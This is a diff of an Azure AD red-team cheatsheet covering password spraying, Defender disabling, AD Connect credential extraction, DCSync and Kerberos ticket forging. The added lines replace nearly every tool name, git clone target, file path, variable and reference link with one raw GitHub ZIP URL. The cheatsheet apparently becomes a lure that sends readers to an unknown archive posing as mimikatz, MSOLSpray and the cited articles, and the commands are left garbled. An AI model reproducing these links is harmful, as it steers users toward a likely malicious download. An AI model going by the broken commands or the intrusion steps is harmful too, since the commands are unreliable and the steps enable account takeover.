+Rule example : `(https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -any (_ -contains "vendor")) -and (https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "guest")`    
 Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group
 
 1. Open user's profile, click on **Manage**
 2. Click on **Resend** invite and to get an invitation URL
 3. Set the secondary email
     ```powershell
-    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
+    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Verbose
     ```
 
 ## Administrative Unit
@@ -890,9 +890,9 @@ PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
 PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
 PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
 PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
-PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl 
+PS AzureAD> Get-AzureADUser -ObjectId <https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip> | fl 
 PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
-PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
+PS C:\Tools> (Get-AzureADUser -All $true | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "<Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
 ```
 
 ## Deployment Template
@@ -911,9 +911,9 @@ cat <PATH TO .json FILE> | Select-String password
 
 ```powershell
 # Enumerate application that have Proxy
-PS C:\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
-PS C:\Tools> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
-PS C:\Tools> . C:\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1
+PS C:\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip;$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip;$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip}catch{}}
+PS C:\Tools> Get-AzureADServicePrincipal -All $true | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "Finance Management System"}
+PS C:\Tools> . C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
 ```
 
@@ -929,11 +929,11 @@ PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
     Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
     # Marking device compliant - option 1: Registering device to Intune
     # Get an access token for Intune MDM and save to cache (prompts for credentials)
-    Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
+    Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -SaveToCache 
     # Join the device to Intune
     Join-AADIntDeviceToIntune -DeviceName "SixByFour"
     # Start the call back
-    Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
+    Start-AADIntDeviceIntuneCallback -PfxFileName .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -DeviceName "SixByFour"
     ```
 
 
@@ -941,8 +941,8 @@ PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
 
 With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.
 
-1. Authenticate to your webmail portal (i.e. https://webmail.domain.com/)
-2. Change your browser URL to: https://azure.microsoft.com/
+1. Authenticate to your webmail portal (i.e. https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+2. Change your browser URL to: https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 3. Pick the account from the active sessions
 4. Select Azure Active Directory and enjoy!
 
@@ -967,22 +967,22 @@ With Microsoft, if you are using any cloud services (Office 365, Exchange Online
     * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password
 
 
-* Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large
-* Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large
-* Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large
-* Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large
+* Azure AD Joined : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* Workplace Joined : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* Hybrid Joined : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* Workplace joined on AADJ or Hybrid : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 ### Password Spray
 
 > Default lockout policy of 10 failed attempts, locking out an account for 60 seconds
 
 ```powershell
-git clone https://github.com/dafthack/MSOLSpray
-Import-Module .\MSOLSpray.ps1
-Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
-Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
+git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Invoke-MSOLSpray -UserList .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Password Winter2020
+Invoke-MSOLSpray -UserList .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Password d0ntSprayme!
 
-# UserList  - UserList file filled with usernames one-per-line in the format "user@domain.com"
+# UserList  - UserList file filled with usernames one-per-line in the format "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip"
 # Password  - A single password that will be used to perform the password spray.
 # OutFile   - A file to output valid results to.
 # Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.
@@ -1010,16 +1010,16 @@ Check if Azure AD Connect is installed : `Get-ADSyncConnector`
 
 ```powershell
 PS > Set-MpPreference -DisableRealtimeMonitoring $true
-PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
-PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
-PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+PS > Copy-Item -ToSession $adcnct -Path C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Destination C:\Users\Administrator\Documents
+PS > Expand-Archive C:\Users\Administrator\Documents\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
+PS > Import-Module C:\Users\Administrator\Documents\AADInternals\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS > Get-AADIntSyncCredentials
 
 # Get Token for SYNC account and reset on-prem admin password
 PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
-PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
+PS > $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip ("<Username>@<TenantName>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip", $passwd)
 PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
-PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
+PS > Get-AADIntUser -UserPrincipalName https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip | select ImmutableId
 PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
 ```
 
@@ -1033,7 +1033,7 @@ PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" 
 
 ### Azure AD Connect - Password extraction
 
-Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
+Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
 --- | --- | --- | --- | ---
@@ -1043,7 +1043,7 @@ ADSyncQuery | No (network RPC calls only) | No | Yes | Yes
 
 
 ```powershell
-git clone https://github.com/fox-it/adconnectdump
+git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 # DCSync with AD Sync account
 ```
 
@@ -1055,9 +1055,9 @@ Requirements:
   * Compromise a server with Azure AD Connect service
   * Access to ADSyncAdmins or local Administrators groups
 
-Use the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password for the MSOL account:
-* `azuread_decrypt_msol.ps1`: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
-* `azuread_decrypt_msol_v2.ps1`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
+Use the script **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** from @xpn to recover the decrypted password for the MSOL account:
+* `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`: AD Connect Sync Credential Extract POC https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.
 
@@ -1069,49 +1069,49 @@ Now you can use the retrieved credentials for the MSOL Account to launch a DCSyn
 
 :warning: The password of the AZUREADSSOACC account never changes.
 
-Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure
+Using [https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure
 
 1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
     ```powershell
-    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip "lsadump::dcsync /user:AZUREADSSOACC$" exit
     ```
-2. AAD logon name of the user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
+2. AAD logon name of the user we want to impersonate, e.g. `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
 3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
 4. Create the Silver Ticket and inject it into Kerberos cache:
     ```powershell
-    mimikatz.exe "kerberos::golden /user:elrond
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip "kerberos::golden /user:elrond
     /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
-    /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
-    /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /rc4:f9969e088b2c13d93833d0ce436c76dd
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /service:HTTP /ptt" exit
     ```
 5. Launch Mozilla Firefox
-6. Go to about:config and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
+6. Go to about:config and set the `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip preference` to value `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip,https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
 7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.
 
 
 ## References
 
-* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
-* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
-* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
-* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)
-* [Get Access Tokens for Managed Service Identity on Azure App Service](https://zhiliaxu.github.io/app-service-managed-identity.html)
-* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://o365blog.com/post/mdm/)
-* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)
-* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
-* [An introduction to penetration testing Azure - Graceful Security](https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-azure/)
-* [Running Powershell scripts on Azure VM - Netspi](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
-* [Attacking Azure Cloud shell - Netspi](https://blog.netspi.com/attacking-azure-cloud-shell/)
-* [Maintaining Azure Persistence via automation accounts - Netspi](https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/)
-* [Detecting an attacks on active directory with Azure - Smartspate](https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/)
-* [Azure AD Overview](https://www.youtube.com/watch?v=l_pnNpdxj20) 
-* [Windows Azure Active Directory in plain English](https://www.youtube.com/watch?v=IcSATObaQZE)
-* [Building Free Active Directory Lab in Azure - @kamran.bilgrami](https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f) 
-* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
-* [Azure AD connect for RedTeam - @xpnsec](https://blog.xpnsec.com/azuread-connect-for-redteam/)
-* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/)
-* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://www.lares.com/hunting-azure-admins-for-vertical-escalation/)
-* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
-* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
-* [AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
-* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
+* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Get Access Tokens for Managed Service Identity on Azure App Service](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [An introduction to penetration testing Azure - Graceful Security](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Running Powershell scripts on Azure VM - Netspi](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Attacking Azure Cloud shell - Netspi](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Maintaining Azure Persistence via automation accounts - Netspi](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Detecting an attacks on active directory with Azure - Smartspate](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Azure AD Overview](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) 
+* [Windows Azure Active Directory in plain English](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Building Free Active Directory Lab in Azure - https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) 
+* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Azure AD connect for RedTeam - @xpnsec](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
+* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
